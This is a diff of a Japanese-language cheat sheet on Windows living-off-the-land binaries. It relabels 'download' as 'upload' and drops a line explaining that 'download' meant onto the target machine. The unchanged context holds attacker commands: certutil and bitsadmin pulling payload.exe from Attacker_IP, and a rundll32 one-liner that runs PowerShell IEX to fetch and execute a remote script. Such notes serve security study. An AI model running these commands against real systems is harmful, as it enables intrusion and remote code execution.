@@ -14,11 +14,9 @@ https://lolbas-project.github.io/
 
 ## ファイル操作
 
-ここでファイルダウンロードと書いているのは、ターゲットマシンにダウンロードするという意味。
-
 ### certutil
 
-ファイルダウンロード
+ファイルアップロード
 
 ```ps
 certutil -URLcache -split -f http://Attacker_IP/payload.exe C:\Windows\Temp\payload.exe
@@ -34,7 +32,7 @@ certutil -decode Encoded-payload.txt payload.exe
 
 ### bitsadmin
 
-ファイルダウンロード
+ファイルアップロード
 
 ```ps
 bitsadmin.exe /transfer /Download /priority Foreground http://Attacker_IP/payload.exe c:\Users\thm\Desktop\payload.exe
@@ -42,7 +40,7 @@ bitsadmin.exe /transfer /Download /priority Foreground http://Attacker_IP/payloa
 
 ### findstr
 
-SMB 経由でファイルダウンロード
+SMB 経由でファイルアップロード
 
 ```ps
 findstr /V dummystring \\MachineName\ShareFolder\test.exe > c:\Windows\Temp\test.exe
@@ -96,7 +94,7 @@ rundll32.exe C:\Windows\Temp\loader.dll,Run
 rundll32.exe javascript:"\..\mshtml.dll,RunHTMLApplication ";eval("w=new ActiveXObject(\"WScript.Shell\");w.run(\"calc\");window.close()");
 ```
 
-Powershell を実行してファイルダウンロードしている
+Powershell を実行してファイルアップロードしている
 
 ```ps
 rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://AttackBox_IP/script.ps1');");
